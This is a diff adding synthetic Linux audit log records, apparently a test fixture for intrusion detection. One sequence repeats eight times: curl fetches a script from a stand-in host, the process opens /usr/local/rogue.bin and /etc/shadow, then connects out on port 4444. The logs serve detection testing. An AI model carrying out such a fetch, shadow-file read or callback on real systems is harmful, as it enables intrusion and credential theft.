@@ -1,0 +1,98 @@
+
+
+type=SYSCALL msg=audit(1699999900.100:3000): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=2002 pid=3001 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-exec-redis"
+type=EXECVE msg=audit(1699999900.100:3000): argc=3 a0="/usr/bin/curl" a1="-s" a2="http://update.example.invalid/x.sh"
+
+type=SYSCALL msg=audit(1699999900.200:3000): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999900.200:3000): item=0 name="/usr/local/rogue.bin" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999900.300:3000): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999900.300:3000): item=0 name="/etc/shadow" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999900.400:3000): arch=c000003e syscall=42 success=yes exit=0 items=1 ppid=3002 pid=3003 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-connect-redis"
+type=SOCKADDR msg=audit(1699999900.400:3000): saddr=0200115CB9DC65040000000000000000
+
+type=SYSCALL msg=audit(1699999901.100:3001): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=2002 pid=3001 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-exec-redis"
+type=EXECVE msg=audit(1699999901.100:3001): argc=3 a0="/usr/bin/curl" a1="-s" a2="http://update.example.invalid/x.sh"
+
+type=SYSCALL msg=audit(1699999901.200:3001): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999901.200:3001): item=0 name="/usr/local/rogue.bin" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999901.300:3001): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999901.300:3001): item=0 name="/etc/shadow" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999901.400:3001): arch=c000003e syscall=42 success=yes exit=0 items=1 ppid=3002 pid=3003 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-connect-redis"
+type=SOCKADDR msg=audit(1699999901.400:3001): saddr=0200115CB9DC65040000000000000000
+
+type=SYSCALL msg=audit(1699999902.100:3002): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=2002 pid=3001 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-exec-redis"
+type=EXECVE msg=audit(1699999902.100:3002): argc=3 a0="/usr/bin/curl" a1="-s" a2="http://update.example.invalid/x.sh"
+
+type=SYSCALL msg=audit(1699999902.200:3002): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999902.200:3002): item=0 name="/usr/local/rogue.bin" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999902.300:3002): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999902.300:3002): item=0 name="/etc/shadow" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999902.400:3002): arch=c000003e syscall=42 success=yes exit=0 items=1 ppid=3002 pid=3003 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-connect-redis"
+type=SOCKADDR msg=audit(1699999902.400:3002): saddr=0200115CB9DC65040000000000000000
+
+type=SYSCALL msg=audit(1699999903.100:3003): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=2002 pid=3001 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-exec-redis"
+type=EXECVE msg=audit(1699999903.100:3003): argc=3 a0="/usr/bin/curl" a1="-s" a2="http://update.example.invalid/x.sh"
+
+type=SYSCALL msg=audit(1699999903.200:3003): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999903.200:3003): item=0 name="/usr/local/rogue.bin" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999903.300:3003): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999903.300:3003): item=0 name="/etc/shadow" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999903.400:3003): arch=c000003e syscall=42 success=yes exit=0 items=1 ppid=3002 pid=3003 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-connect-redis"
+type=SOCKADDR msg=audit(1699999903.400:3003): saddr=0200115CB9DC65040000000000000000
+
+type=SYSCALL msg=audit(1699999904.100:3004): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=2002 pid=3001 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-exec-redis"
+type=EXECVE msg=audit(1699999904.100:3004): argc=3 a0="/usr/bin/curl" a1="-s" a2="http://update.example.invalid/x.sh"
+
+type=SYSCALL msg=audit(1699999904.200:3004): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999904.200:3004): item=0 name="/usr/local/rogue.bin" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999904.300:3004): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999904.300:3004): item=0 name="/etc/shadow" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999904.400:3004): arch=c000003e syscall=42 success=yes exit=0 items=1 ppid=3002 pid=3003 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-connect-redis"
+type=SOCKADDR msg=audit(1699999904.400:3004): saddr=0200115CB9DC65040000000000000000
+
+type=SYSCALL msg=audit(1699999905.100:3005): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=2002 pid=3001 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-exec-redis"
+type=EXECVE msg=audit(1699999905.100:3005): argc=3 a0="/usr/bin/curl" a1="-s" a2="http://update.example.invalid/x.sh"
+
+type=SYSCALL msg=audit(1699999905.200:3005): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999905.200:3005): item=0 name="/usr/local/rogue.bin" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999905.300:3005): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999905.300:3005): item=0 name="/etc/shadow" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999905.400:3005): arch=c000003e syscall=42 success=yes exit=0 items=1 ppid=3002 pid=3003 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-connect-redis"
+type=SOCKADDR msg=audit(1699999905.400:3005): saddr=0200115CB9DC65040000000000000000
+
+type=SYSCALL msg=audit(1699999906.100:3006): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=2002 pid=3001 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-exec-redis"
+type=EXECVE msg=audit(1699999906.100:3006): argc=3 a0="/usr/bin/curl" a1="-s" a2="http://update.example.invalid/x.sh"
+
+type=SYSCALL msg=audit(1699999906.200:3006): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999906.200:3006): item=0 name="/usr/local/rogue.bin" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999906.300:3006): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999906.300:3006): item=0 name="/etc/shadow" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999906.400:3006): arch=c000003e syscall=42 success=yes exit=0 items=1 ppid=3002 pid=3003 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-connect-redis"
+type=SOCKADDR msg=audit(1699999906.400:3006): saddr=0200115CB9DC65040000000000000000
+
+type=SYSCALL msg=audit(1699999907.100:3007): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=2002 pid=3001 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-exec-redis"
+type=EXECVE msg=audit(1699999907.100:3007): argc=3 a0="/usr/bin/curl" a1="-s" a2="http://update.example.invalid/x.sh"
+
+type=SYSCALL msg=audit(1699999907.200:3007): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999907.200:3007): item=0 name="/usr/local/rogue.bin" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999907.300:3007): arch=c000003e syscall=257 success=yes exit=5 items=1 ppid=3001 pid=3002 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-open-redis"
+type=PATH msg=audit(1699999907.300:3007): item=0 name="/etc/shadow" inode=1301 dev=fd:01 mode=0100000 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
+
+type=SYSCALL msg=audit(1699999907.400:3007): arch=c000003e syscall=42 success=yes exit=0 items=1 ppid=3002 pid=3003 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-connect-redis"
+type=SOCKADDR msg=audit(1699999907.400:3007): saddr=0200115CB9DC65040000000000000000
+
